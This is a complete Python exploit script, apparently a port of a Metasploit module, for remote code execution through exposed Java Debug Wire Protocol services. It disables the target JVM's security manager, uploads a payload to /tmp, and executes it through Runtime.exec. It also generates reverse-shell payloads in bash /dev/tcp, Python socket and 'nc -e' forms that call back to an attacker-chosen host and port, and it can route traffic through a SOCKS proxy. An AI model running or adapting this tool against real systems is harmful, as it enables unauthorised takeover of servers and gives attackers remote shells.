#!/usr/bin/env python3
"""
JDWP (Java Debug Wire Protocol) Remote Code Execution Exploit
Python implementation of the Metasploit JDWP module

This exploit abuses exposed Java Debug Wire Protocol services to execute
arbitrary code remotely. No authentication is required if the service is enabled.
"""

import socket
import struct
import sys
import argparse
import os
import tempfile
import random
import string
import time
from typing import Dict, List, Tuple, Optional, Any

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

class JDWPExploit:
    # Protocol constants
    HANDSHAKE = b"JDWP-Handshake"
    REQUEST_PACKET_TYPE = 0x00
    REPLY_PACKET_TYPE = 0x80
    
    # Command signatures
    VERSION_SIG = [1, 1]
    CLASSESBYSIGNATURE_SIG = [1, 2]
    ALLCLASSES_SIG = [1, 3]
    ALLTHREADS_SIG = [1, 4]
    IDSIZES_SIG = [1, 7]
    CREATESTRING_SIG = [1, 11]
    SUSPENDVM_SIG = [1, 8]
    RESUMEVM_SIG = [1, 9]
    SIGNATURE_SIG = [2, 1]
    FIELDS_SIG = [2, 4]
    METHODS_SIG = [2, 5]
    GETVALUES_SIG = [2, 6]
    CLASSOBJECT_SIG = [2, 11]
    SETSTATICVALUES_SIG = [3, 2]
    INVOKESTATICMETHOD_SIG = [3, 3]
    CREATENEWINSTANCE_SIG = [3, 4]
    ARRAYNEWINSTANCE_SIG = [4, 1]
    REFERENCETYPE_SIG = [9, 1]
    INVOKEMETHOD_SIG = [9, 6]
    STRINGVALUE_SIG = [10, 1]
    THREADNAME_SIG = [11, 1]
    THREADSUSPEND_SIG = [11, 2]
    THREADRESUME_SIG = [11, 3]
    THREADSTATUS_SIG = [11, 4]
    ARRAYSETVALUES_SIG = [13, 3]
    EVENTSET_SIG = [15, 1]
    EVENTCLEAR_SIG = [15, 2]
    EVENTCLEARALL_SIG = [15, 3]
    
    # Other codes
    MODKIND_COUNT = 1
    MODKIND_THREADONLY = 2
    MODKIND_CLASSMATCH = 5
    MODKIND_LOCATIONONLY = 7
    MODKIND_STEP = 10
    EVENT_BREAKPOINT = 2
    EVENT_STEP = 1
    SUSPEND_EVENTTHREAD = 1
    SUSPEND_ALL = 2
    NOT_IMPLEMENTED = 99
    VM_DEAD = 112
    INVOKE_SINGLE_THREADED = 2
    TAG_OBJECT = 76
    TAG_STRING = 115
    TYPE_CLASS = 1
    TAG_ARRAY = 91
    TAG_VOID = 86
    TAG_THREAD = 116
    STEP_INTO = 0
    STEP_MIN = 0
    THREAD_SLEEPING_STATUS = 2
    
    def __init__(self, target_host: str, target_port: int = 8000, timeout: int = 10, num_retries: int = 10, lhost: str = "127.0.0.1", lport: int = 4444, proxy_host: str = None, proxy_port: int = None):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.num_retries = num_retries
        self.lhost = lhost
        self.lport = lport
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.socket: Optional[socket.socket] = None
        self.my_id = 0x01
        self.vars = {}
        self.classes = []
        self.methods = {}
        self.threads = {}
        self.os = None
        
    def connect(self):
        """Connect to the JDWP service"""
        try:
            if self.proxy_host and self.proxy_port:
                # Use SOCKS proxy
                if not SOCKS_AVAILABLE:
                    print("[-] PySocks library not available. Install with: pip install PySocks")
                    return False
                
                print(f"[+] Connecting through SOCKS proxy {self.proxy_host}:{self.proxy_port}")
                self.socket = socks.socksocket()
                self.socket.set_proxy(socks.SOCKS5, self.proxy_host, self.proxy_port)
            else:
                # Direct connection
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            self.socket.settimeout(self.timeout)
            self.socket.connect((self.target_host, self.target_port))
            print(f"[+] Connected to {self.target_host}:{self.target_port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def disconnect(self):
        """Disconnect from the JDWP service"""
        if self.socket:
            self.socket.close()
            self.socket = None
    
    def handshake(self) -> Optional[bytes]:
        """Perform JDWP handshake"""
        if not self.socket:
            return None
        try:
            self.socket.send(self.HANDSHAKE)
            response = self.socket.recv(1024)
            return response
        except Exception as e:
            print(f"[-] Handshake failed: {e}")
            return None
    
    def create_packet(self, cmdsig: List[int], data: bytes = b"") -> bytes:
        """Create a JDWP packet"""
        flags = 0x00
        cmdset, cmd = cmdsig
        pktlen = len(data) + 11
        
        packet = struct.pack(">IIBBB", pktlen, self.my_id, flags, cmdset, cmd)
        packet += data
        self.my_id += 2
        return packet
    
    def read_reply(self, timeout: Optional[int] = None) -> Optional[bytes]:
        """Read a JDWP reply packet"""
        if not self.socket:
            return None
            
        if timeout is None:
            timeout = self.timeout
            
        try:
            # Read packet length
            length_data = self.socket.recv(4)
            if not length_data:
                return None
            
            pkt_len = struct.unpack(">I", length_data)[0]
            if pkt_len < 4:
                print("[-] Received corrupted response")
                return None
            
            # Read rest of header
            header_data = self.socket.recv(7)
            if not header_data:
                return None
                
            packet_id, flags, err_code = struct.unpack(">IBH", header_data)
            
            if err_code != 0 and flags == self.REPLY_PACKET_TYPE:
                print(f"[-] Server sent error with code {err_code}")
                return None
            
            # Read response data
            response = b""
            remaining = pkt_len - 11
            while len(response) < remaining:
                chunk = self.socket.recv(remaining - len(response))
                if not chunk:
                    return None
                response += chunk
            
            return response
            
        except Exception as e:
            print(f"[-] Error reading reply: {e}")
            return None
    
    def format_data(self, fmt, value: int) -> bytes:
        """Format data for JDWP protocol"""
        if fmt == "L" or fmt == 8:
            return struct.pack(">Q", value)
        elif fmt == "I" or fmt == 4:
            return struct.pack(">I", value)
        else:
            raise ValueError(f"Unknown format: {fmt}")
    
    def unformat_data(self, fmt, data: bytes) -> int:
        """Unformat data from JDWP protocol"""
        if fmt == "L" or fmt == 8:
            return struct.unpack(">Q", data[:8])[0]
        elif fmt == "I" or fmt == 4:
            return struct.unpack(">I", data[:4])[0]
        else:
            raise ValueError(f"Unknown format: {fmt}")
    
    def parse_entries(self, buf: bytes, formats: List[Tuple], explicit: bool = True) -> List[Dict]:
        """Parse entries from JDWP response"""
        entries = []
        index = 0
        
        if explicit:
            nb_entries = struct.unpack(">I", buf[:4])[0]
            buf = buf[4:]
        else:
            nb_entries = 1
        
        for var in range(nb_entries):
            data = {}
            
            for fmt, name in formats:
                if fmt == "L" or fmt == 8:
                    data[name] = struct.unpack(">Q", buf[index:index+8])[0]
                    index += 8
                elif fmt == "I" or fmt == 4:
                    data[name] = struct.unpack(">I", buf[index:index+4])[0]
                    index += 4
                elif fmt == "S":
                    data_len = struct.unpack(">I", buf[index:index+4])[0]
                    data[name] = buf[index+4:index+4+data_len].decode('utf-8')
                    index += 4 + data_len
                elif fmt == "C":
                    data[name] = struct.unpack("B", buf[index:index+1])[0]
                    index += 1
                elif fmt == "Z":
                    t = struct.unpack("B", buf[index:index+1])[0]
                    if t == 115:  # String
                        string_id = struct.unpack(">Q", buf[index+1:index+9])[0]
                        data[name] = self.solve_string(struct.pack(">Q", string_id))
                        index += 9
                    elif t == 73:  # Integer
                        data[name] = struct.unpack(">I", buf[index+1:index+5])[0]
                        index += 5
                elif isinstance(fmt, int):
                    # Handle variable-sized data types (only support 4 and 8 byte integers)
                    if fmt == 8:
                        data[name] = struct.unpack(">Q", buf[index:index+8])[0]
                        index += 8
                    elif fmt == 4:
                        data[name] = struct.unpack(">I", buf[index:index+4])[0]
                        index += 4
                    else:
                        raise ValueError(f"Unsupported data type size: {fmt} (only 4 and 8 bytes supported)")
                else:
                    raise ValueError(f"Unexpected data format: {fmt}")
            
            entries.append(data)
        
        return entries
    
    def get_sizes(self):
        """Get sizes of variably-sized data types"""
        formats = [
            ("I", "fieldid_size"),
            ("I", "methodid_size"),
            ("I", "objectid_size"),
            ("I", "referencetypeid_size"),
            ("I", "frameid_size")
        ]
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        packet = self.create_packet(self.IDSIZES_SIG)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            entries = self.parse_entries(response, formats, False)
            for entry in entries:
                self.vars.update(entry)
    
    def get_version(self):
        """Get JDWP version"""
        formats = [
            ("S", "descr"),
            ("I", "jdwp_major"),
            ("I", "jdwp_minor"),
            ("S", "vm_version"),
            ("S", "vm_name")
        ]
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        packet = self.create_packet(self.VERSION_SIG)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            entries = self.parse_entries(response, formats, False)
            for entry in entries:
                self.vars.update(entry)
    
    def get_all_threads(self):
        """Get all running threads"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        packet = self.create_packet(self.ALLTHREADS_SIG)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            num_threads = struct.unpack(">I", response[:4])[0]
            index = 4
            size = self.vars["objectid_size"]
            
            for _ in range(num_threads):
                t_id = self.unformat_data(size, response[index:index+size])
                self.threads[t_id] = None
                index += size
    
    def get_all_classes(self):
        """Get all loaded classes"""
        if self.classes:
            return
        
        formats = [
            ("C", "reftype_tag"),
            (self.vars["referencetypeid_size"], "reftype_id"),
            ("S", "signature"),
            ("I", "status")
        ]
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        packet = self.create_packet(self.ALLCLASSES_SIG)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            self.classes.append(self.parse_entries(response, formats))
    
    def get_class_by_name(self, name: str) -> Optional[Dict]:
        """Find a class by name"""
        for entry_array in self.classes:
            for entry in entry_array:
                if entry["signature"].lower() == name.lower():
                    return entry
        return None
    
    def get_methods(self, reftype_id: int) -> List[Dict]:
        """Get methods for a reference type"""
        if reftype_id in self.methods:
            return self.methods[reftype_id]
        
        formats = [
            (self.vars["methodid_size"], "method_id"),
            ("S", "name"),
            ("S", "signature"),
            ("I", "mod_bits")
        ]
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        ref_id = self.format_data(self.vars["referencetypeid_size"], reftype_id)
        packet = self.create_packet(self.METHODS_SIG, ref_id)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            self.methods[reftype_id] = self.parse_entries(response, formats)
            return self.methods[reftype_id]
        
        return []
    
    def get_method_by_name(self, class_id: int, name: str, signature: Optional[str] = None) -> Optional[Dict]:
        """Find a method by name in a class"""
        methods = self.get_methods(class_id)
        for method in methods:
            if signature is None:
                if method["name"].lower() == name.lower():
                    return method
            else:
                if (method["name"].lower() == name.lower() and 
                    method["signature"].lower() == signature.lower()):
                    return method
        return None
    
    def get_class_and_method(self, classname: str, methodname: str, signature: Optional[str] = None) -> Tuple[Dict, Dict]:
        """Get both class and method"""
        target_class = self.get_class_by_name(classname)
        if not target_class:
            raise ValueError(f"Class '{classname}' not found")
        
        target_method = self.get_method_by_name(target_class["reftype_id"], methodname, signature)
        if not target_method:
            raise ValueError(f"Method '{methodname}' not found")
        
        return target_class, target_method
    
    def create_string(self, data: str) -> List[Dict]:
        """Create a string in the target VM"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        string_data = struct.pack(">I", len(data)) + data.encode('utf-8')
        packet = self.create_packet(self.CREATESTRING_SIG, string_data)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            return self.parse_entries(response, [(self.vars["objectid_size"], "obj_id")], False)
        return []
    
    def solve_string(self, string_id_data: bytes) -> str:
        """Get string value from string ID"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        packet = self.create_packet(self.STRINGVALUE_SIG, string_id_data)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            data_len = struct.unpack(">I", response[:4])[0]
            return response[4:4+data_len].decode('utf-8')
        return ""
    
    def thread_status(self, thread_id: int) -> int:
        """Get thread status"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        thread_data = self.format_data(self.vars["objectid_size"], thread_id)
        packet = self.create_packet(self.THREADSTATUS_SIG, thread_data)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            status, suspend_status = struct.unpack(">II", response[:8])
            return status
        return 0
    
    def suspend_vm(self, thread_id: Optional[int] = None):
        """Suspend VM or thread"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        if thread_id is None:
            packet = self.create_packet(self.SUSPENDVM_SIG)
        else:
            thread_data = self.format_data(self.vars["objectid_size"], thread_id)
            packet = self.create_packet(self.THREADSUSPEND_SIG, thread_data)
        
        self.socket.send(packet)
        return self.read_reply()
    
    def resume_vm(self, thread_id: Optional[int] = None):
        """Resume VM or thread"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        if thread_id is None:
            packet = self.create_packet(self.RESUMEVM_SIG)
        else:
            thread_data = self.format_data(self.vars["objectid_size"], thread_id)
            packet = self.create_packet(self.THREADRESUME_SIG, thread_data)
        
        self.socket.send(packet)
        return self.read_reply()
    
    def send_event(self, event_code: int, args: List[Tuple]) -> Optional[int]:
        """Set an event request"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = struct.pack("BB", event_code, self.SUSPEND_ALL)
        data += struct.pack(">I", len(args))
        
        for kind, option in args:
            data += struct.pack("B", kind)
            data += option
        
        packet = self.create_packet(self.EVENTSET_SIG, data)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            return struct.unpack(">I", response[:4])[0]
        return None
    
    def parse_event(self, buf: bytes, event_id: int, thread_id: int) -> bool:
        """Parse and validate event"""
        if len(buf) < 10 + self.vars["objectid_size"] - 1:
            return False
        
        r_id = struct.unpack(">I", buf[6:10])[0]
        t_id = self.unformat_data(self.vars["objectid_size"], 
                                 buf[10:10+self.vars["objectid_size"]])
        
        return (event_id == r_id) and (thread_id == t_id)
    
    def clear_event(self, event_code: int, r_id: int):
        """Clear an event request"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = struct.pack("B", event_code)
        data += struct.pack(">I", r_id)
        packet = self.create_packet(self.EVENTCLEAR_SIG, data)
        self.socket.send(packet)
        return self.read_reply()
    
    def invoke_static(self, class_id: int, thread_id: int, method_id: int, args: Optional[List[bytes]] = None) -> Optional[bytes]:
        """Invoke a static method"""
        if args is None:
            args = []
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = self.format_data(self.vars["referencetypeid_size"], class_id)
        data += self.format_data(self.vars["objectid_size"], thread_id)
        data += self.format_data(self.vars["methodid_size"], method_id)
        data += struct.pack(">I", len(args))
        
        for arg in args:
            data += arg
            data += struct.pack(">I", 0)
        
        packet = self.create_packet(self.INVOKESTATICMETHOD_SIG, data)
        self.socket.send(packet)
        return self.read_reply()
    
    def invoke_method(self, obj_id: int, thread_id: int, class_id: int, method_id: int, args: Optional[List[bytes]] = None) -> Optional[bytes]:
        """Invoke an instance method"""
        if args is None:
            args = []
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = self.format_data(self.vars["objectid_size"], obj_id)
        data += self.format_data(self.vars["objectid_size"], thread_id)
        data += self.format_data(self.vars["referencetypeid_size"], class_id)
        data += self.format_data(self.vars["methodid_size"], method_id)
        data += struct.pack(">I", len(args))
        
        for arg in args:
            data += arg
            data += struct.pack(">I", 0)
        
        packet = self.create_packet(self.INVOKEMETHOD_SIG, data)
        self.socket.send(packet)
        return self.read_reply()
    
    def create_instance(self, class_id: int, thread_id: int, method_id: int, args: Optional[List[bytes]] = None) -> Optional[bytes]:
        """Create a new instance"""
        if args is None:
            args = []
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = self.format_data(self.vars["referencetypeid_size"], class_id)
        data += self.format_data(self.vars["objectid_size"], thread_id)
        data += self.format_data(self.vars["methodid_size"], method_id)
        data += struct.pack(">I", len(args))
        
        for arg in args:
            data += arg
            data += struct.pack(">I", 0)
        
        packet = self.create_packet(self.CREATENEWINSTANCE_SIG, data)
        self.socket.send(packet)
        return self.read_reply()
    
    def create_array(self, length: int) -> Optional[bytes]:
        """Create a byte array"""
        target_class = self.get_class_by_name("[B")
        if not target_class:
            raise ValueError("Byte array class not found")
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        type_id = target_class["reftype_id"]
        data = self.format_data(self.vars["referencetypeid_size"], type_id)
        data += struct.pack(">I", length)
        
        packet = self.create_packet(self.ARRAYNEWINSTANCE_SIG, data)
        self.socket.send(packet)
        return self.read_reply()
    
    def set_array_values(self, obj_id: int, values: List[int]):
        """Set values in an array"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = self.format_data(self.vars["objectid_size"], obj_id)
        data += struct.pack(">I", 0)  # First index
        data += struct.pack(">I", len(values))
        
        for value in values:
            data += struct.pack("B", value)
        
        packet = self.create_packet(self.ARRAYSETVALUES_SIG, data)
        self.socket.send(packet)
        return self.read_reply()
    
    def get_fields(self, reftype_id: int) -> List[Dict]:
        """Get fields for a reference type"""
        formats = [
            (self.vars["fieldid_size"], "field_id"),
            ("S", "name"),
            ("S", "signature"),
            ("I", "mod_bits")
        ]
        
        if not self.socket:
            raise ValueError("Socket not connected")
        
        ref_id = self.format_data(self.vars["referencetypeid_size"], reftype_id)
        packet = self.create_packet(self.FIELDS_SIG, ref_id)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            return self.parse_entries(response, formats)
        return []
    
    def get_field_value(self, reftype_id: int, field_id: int) -> int:
        """Get static field value"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = self.format_data(self.vars["referencetypeid_size"], reftype_id)
        data += struct.pack(">I", 1)  # Number of fields
        data += self.format_data(self.vars["fieldid_size"], field_id)
        
        packet = self.create_packet(self.GETVALUES_SIG, data)
        self.socket.send(packet)
        response = self.read_reply()
        
        if response:
            num_values = struct.unpack(">I", response[:4])[0]
            if num_values == 1 and response[4] == self.TAG_OBJECT:
                return self.unformat_data(self.vars["objectid_size"], response[5:])
        return 0
    
    def set_field_value(self, reftype_id: int, field_id: int, value: int):
        """Set static field value"""
        if not self.socket:
            raise ValueError("Socket not connected")
        
        data = self.format_data(self.vars["referencetypeid_size"], reftype_id)
        data += struct.pack(">I", 1)  # Number of fields
        data += self.format_data(self.vars["fieldid_size"], field_id)
        data += self.format_data(self.vars["objectid_size"], value)
        
        packet = self.create_packet(self.SETSTATICVALUES_SIG, data)
        self.socket.send(packet)
        return self.read_reply()
    
    def fingerprint_os(self, thread_id: int) -> str:
        """Get OS information"""
        # Create string for "os.name" property
        cmd_obj_ids = self.create_string("os.name")
        if not cmd_obj_ids:
            raise ValueError("Failed to create string for OS fingerprinting")
        
        cmd_obj_id = cmd_obj_ids[0]["obj_id"]
        size = self.vars["objectid_size"]
        
        # Call System.getProperty("os.name")
        data = struct.pack("B", self.TAG_OBJECT)
        data += self.format_data(size, cmd_obj_id)
        
        runtime_class, runtime_method = self.get_class_and_method("Ljava/lang/System;", "getProperty")
        response = self.invoke_static(runtime_class["reftype_id"], thread_id, 
                                    runtime_method["method_id"], [data])
        
        if response and response[0] == self.TAG_STRING:
            string_id = self.unformat_data(size, response[1:1+size])
            os_name = self.solve_string(self.format_data(size, string_id))
            self.os = os_name
            return os_name
        
        return "unknown"
    
    def execute_command(self, thread_id: int, command: str):
        """Execute a system command"""
        # Create command string
        cmd_obj_ids = self.create_string(command)
        if not cmd_obj_ids:
            raise ValueError("Failed to create command string")
        
        cmd_obj_id = cmd_obj_ids[0]["obj_id"]
        size = self.vars["objectid_size"]
        
        # Get Runtime.getRuntime()
        runtime_class, runtime_method = self.get_class_and_method("Ljava/lang/Runtime;", "getRuntime")
        response = self.invoke_static(runtime_class["reftype_id"], thread_id, runtime_method["method_id"])
        
        if not response or response[0] != self.TAG_OBJECT:
            raise ValueError("Failed to get Runtime instance")
        
        runtime_obj = self.unformat_data(size, response[1:1+size])
        
        # Find exec method
        exec_method = self.get_method_by_name(runtime_class["reftype_id"], "exec")
        if not exec_method:
            raise ValueError("Failed to find Runtime.exec method")
        
        # Execute command
        data = struct.pack("B", self.TAG_OBJECT)
        data += self.format_data(size, cmd_obj_id)
        
        response = self.invoke_method(runtime_obj, thread_id, runtime_class["reftype_id"], 
                                    exec_method["method_id"], [data])
        
        if not response or response[0] != self.TAG_OBJECT:
            raise ValueError("Failed to execute command")
    
    def set_step_event(self) -> Tuple[int, int]:
        """Set up step event for code execution"""
        # Find a sleeping thread
        thread_id = None
        for tid in self.threads:
            if self.thread_status(tid) == self.THREAD_SLEEPING_STATUS:
                thread_id = tid
                break
        
        if thread_id is None:
            raise ValueError("Could not find suitable thread for stepping")
        
        # Suspend VM
        self.suspend_vm()
        
        print(f"[+] Setting step event for thread {thread_id}")
        
        # Create step event
        step_info = self.format_data(self.vars["objectid_size"], thread_id)
        step_info += struct.pack(">I", self.STEP_MIN)
        step_info += struct.pack(">I", self.STEP_INTO)
        
        event_id = self.send_event(self.EVENT_STEP, [(self.MODKIND_STEP, step_info)])
        if event_id is None:
            raise ValueError("Failed to set step event")
        
        return event_id, thread_id
    
    def disable_security_manager(self):
        """Disable Java security manager"""
        sys_class = self.get_class_by_name("Ljava/lang/System;")
        if not sys_class:
            raise ValueError("System class not found")
        
        fields = self.get_fields(sys_class["reftype_id"])
        sec_field = None
        
        for field in fields:
            if field["name"].lower() == "security":
                sec_field = field["field_id"]
                break
        
        if sec_field is None:
            raise ValueError("Security field not found")
        
        # Check current value
        current_value = self.get_field_value(sys_class["reftype_id"], sec_field)
        
        if current_value == 0:
            print("[+] Security manager is not set")
        else:
            print("[+] Disabling security manager...")
            self.set_field_value(sys_class["reftype_id"], sec_field, 0)
            
            # Verify
            new_value = self.get_field_value(sys_class["reftype_id"], sec_field)
            if new_value == 0:
                print("[+] Security manager disabled successfully")
            else:
                print("[!] Security manager may not be disabled, continuing anyway...")
    
    def generate_payload(self, payload_type: str = "bash") -> bytes:
        """Generate payload based on OS"""
        if payload_type == "bash":
            # Configurable reverse shell payload
            payload = f'#!/bin/bash\n/bin/bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\n'
            return payload.encode()
        elif payload_type == "python":
            # Python reverse shell payload
            payload = f'''#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.lhost}",{self.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'''
            return payload.encode()
        elif payload_type == "nc":
            # Netcat reverse shell payload
            payload = f'#!/bin/bash\nnc -e /bin/bash {self.lhost} {self.lport}\n'
            return payload.encode()
        else:
            return b'#!/bin/bash\necho "JDWP Exploit Success!"\n'
    
    def upload_and_execute_payload(self, thread_id: int, payload: bytes):
        """Upload and execute payload"""
        # Create temporary filename
        temp_filename = "/tmp/" + ''.join(random.choices(string.ascii_letters, k=8))
        
        try:
            # Create FileOutputStream
            filename_obj = self.create_string(temp_filename)
            if not filename_obj:
                raise ValueError("Failed to create filename string")
            
            filename_id = filename_obj[0]["obj_id"]
            size = self.vars["objectid_size"]
            
            # Create FileOutputStream instance
            data = struct.pack("B", self.TAG_OBJECT)
            data += self.format_data(size, filename_id)
            
            fos_class, fos_constructor = self.get_class_and_method("Ljava/io/FileOutputStream;", 
                                                                 "<init>", "(Ljava/lang/String;)V")
            response = self.create_instance(fos_class["reftype_id"], thread_id, 
                                          fos_constructor["method_id"], [data])
            
            if not response or response[0] != self.TAG_OBJECT:
                raise ValueError("Failed to create FileOutputStream")
            
            file_obj = self.unformat_data(size, response[1:1+size])
            
            # Create byte array with payload
            array_response = self.create_array(len(payload))
            if not array_response or array_response[0] != self.TAG_ARRAY:
                raise ValueError("Failed to create byte array")
            
            array_obj = self.unformat_data(size, array_response[1:1+size])
            
            # Set array values
            self.set_array_values(array_obj, list(payload))
            
            # Write to file
            write_method = self.get_method_by_name(fos_class["reftype_id"], "write", "([B)V")
            if not write_method:
                raise ValueError("Failed to find write method")
            
            write_data = struct.pack("B", self.TAG_OBJECT)
            write_data += self.format_data(size, array_obj)
            
            response = self.invoke_method(file_obj, thread_id, fos_class["reftype_id"], 
                                        write_method["method_id"], [write_data])
            
            if not response or response[0] != self.TAG_VOID:
                raise ValueError("Failed to write payload to file")
            
            # Close file
            close_method = self.get_method_by_name(fos_class["reftype_id"], "close")
            if close_method:
                self.invoke_method(file_obj, thread_id, fos_class["reftype_id"], 
                                 close_method["method_id"])
            
            # Make executable and execute
            self.execute_command(thread_id, f"chmod +x {temp_filename}")
            print(f"[+] Executing payload: {temp_filename}")
            self.execute_command(thread_id, temp_filename)
            
        except Exception as e:
            print(f"[-] Payload execution failed: {e}")
    
    def exploit(self, payload: Optional[bytes] = None):
        """Main exploit method"""
        try:
            print("[+] Starting JDWP exploit...")
            
            # Connect and handshake
            if not self.connect():
                return False
            
            handshake_response = self.handshake()
            if handshake_response != self.HANDSHAKE:
                print("[-] JDWP handshake failed")
                return False
            
            print("[+] JDWP handshake successful")
            
            # Get VM information
            print("[+] Getting VM information...")
            self.get_sizes()
            self.get_version()
            
            vm_info = f"{self.vars.get('vm_name', 'Unknown')} - {self.vars.get('vm_version', 'Unknown')}"
            print(f"[+] Target VM: {vm_info}")
            
            # Get classes and threads
            print("[+] Enumerating classes and threads...")
            self.get_all_classes()
            self.get_all_threads()
            
            print(f"[+] Found {len(self.threads)} threads")
            
            # Set step event
            print("[+] Setting up step event...")
            event_id, thread_id = self.set_step_event()
            
            # Resume and wait for event
            print("[+] Resuming VM and waiting for step event...")
            response = self.resume_vm()
            
            # Implement retry mechanism like the Ruby Metasploit version
            if not response or not self.parse_event(response, event_id, thread_id):
                event_received = False
                for i in range(self.num_retries):
                    print(f"[+] Received {i + 1} responses that are not a 'step into' event...")
                    buf = self.read_reply()
                    if buf and self.parse_event(buf, event_id, thread_id):
                        event_received = True
                        break
                    
                    if i == self.num_retries - 1:
                        print(f"[-] Event not received in {self.num_retries} attempts")
                        return False
                
                if not event_received:
                    print("[-] Failed to receive expected step event")
                    return False
            
            print(f"[+] Received step event from thread {thread_id}")
            
            # Clear event
            self.clear_event(self.EVENT_STEP, event_id)
            
            # Disable security manager
            print("[+] Disabling security manager...")
            self.disable_security_manager()
            
            # Fingerprint OS
            print("[+] Fingerprinting target OS...")
            os_name = self.fingerprint_os(thread_id)
            print(f"[+] Target OS: {os_name}")
            
            # Execute payload
            if payload is None:
                raise ValueError("No payload provided")
            
            print("[+] Uploading and executing payload...")
            self.upload_and_execute_payload(thread_id, payload)
            
            print("[+] Exploit completed successfully!")
            return True
            
        except Exception as e:
            print(f"[-] Exploit failed: {e}")
            return False
        finally:
            self.disconnect()

def main():
    parser = argparse.ArgumentParser(description='JDWP Remote Code Execution Exploit')
    parser.add_argument('target', help='Target host')
    parser.add_argument('-p', '--port', type=int, default=8000, help='Target port (default: 8000)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Socket timeout (default: 10)')
    parser.add_argument('-r', '--retries', type=int, default=10, help='Number of retries when waiting for event (default: 10)')
    parser.add_argument('--lhost', default='127.0.0.1', help='Local host for reverse shell (default: 127.0.0.1)')
    parser.add_argument('--lport', type=int, default=4444, help='Local port for reverse shell (default: 4444)')
    parser.add_argument('--payload-type', choices=['bash', 'python', 'nc'], default='bash', help='Type of reverse shell payload (default: bash)')
    parser.add_argument('--payload', help='Custom payload file')
    parser.add_argument('--proxy-host', help='SOCKS proxy host (e.g., 127.0.0.1)')
    parser.add_argument('--proxy-port', type=int, help='SOCKS proxy port (e.g., 9050)')
    
    args = parser.parse_args()
    
    # Create exploit instance
    exploit = JDWPExploit(args.target, args.port, args.timeout, args.retries, args.lhost, args.lport, args.proxy_host, args.proxy_port)
    
    # Prepare payload
    payload = None
    if args.payload:
        try:
            with open(args.payload, 'rb') as f:
                payload = f.read()
        except Exception as e:
            print(f"[-] Failed to read payload file: {e}")
            return
    else:
        # Generate default reverse shell payload
        payload = exploit.generate_payload(args.payload_type)
        print(f"[+] Generated {args.payload_type} reverse shell payload for {args.lhost}:{args.lport}")
    
    # Run exploit
    success = exploit.exploit(payload)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main() 
